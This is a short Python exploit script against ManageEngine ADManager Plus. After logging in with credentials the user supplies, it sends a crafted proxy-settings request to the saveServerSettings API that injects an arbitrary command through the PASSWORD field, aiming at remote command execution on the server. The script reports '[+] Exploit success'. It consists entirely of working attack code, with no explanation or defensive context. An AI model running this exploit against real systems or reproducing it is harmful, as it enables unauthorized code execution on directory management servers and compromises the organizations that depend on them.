import requests
import sys

host = "http://192.168.247.192:8080"
def login(session, username, password):
    data = {"is_admp_pass_encrypted":False,"j_username":username,"j_password":password,"domainName":"ADManager Plus Authentication","AUTHRULE_NAME":"ADAuthenticator"}

    url = host+"/j_security_check"

    response = session.post(url, data=data, proxies={"http":"127.0.0.1:8080"}, verify=False)
    if response.status_code == 200:
        return True
    else:
        print(response.status_code)
        return False
    
def changeConfig(session, cmd):

    data= {"params":"[{\"tabId\":\"proxy\",\"tabName\":\"Proxy Settings\",\"PORT\":\"8080\",\"PASSWORD\":\"(%s)\",\"ENABLE_PROXY\":true,\"SERVER_NAME\":\"127.0.0.1\",\"USER_NAME\":\"admin\"}]"%cmd, "admpcsrf":"ab8dfd66-1da0-4f75-99a2-cf08f0d699b2"}    
    return session.post(host+"/api/json/admin/saveServerSettings", data=data).json()


if __name__ == "__main__":

    host = input("Enter host: ")
    username =  input("Enter username: ")
    password = input("Enter password: ")
    cmd = input("Enter command: ")

    sess = requests.Session()
    sess.cookies.set("admpcsrf", "ab8dfd66-1da0-4f75-99a2-cf08f0d699b2")
    sess.get(host)

    if login(sess, username, password):
        print("Login successful")
        
        if changeConfig(sess, cmd)["status"] == 'success':
            print("[+] Exploit success")
    else:
        print("Login failed")

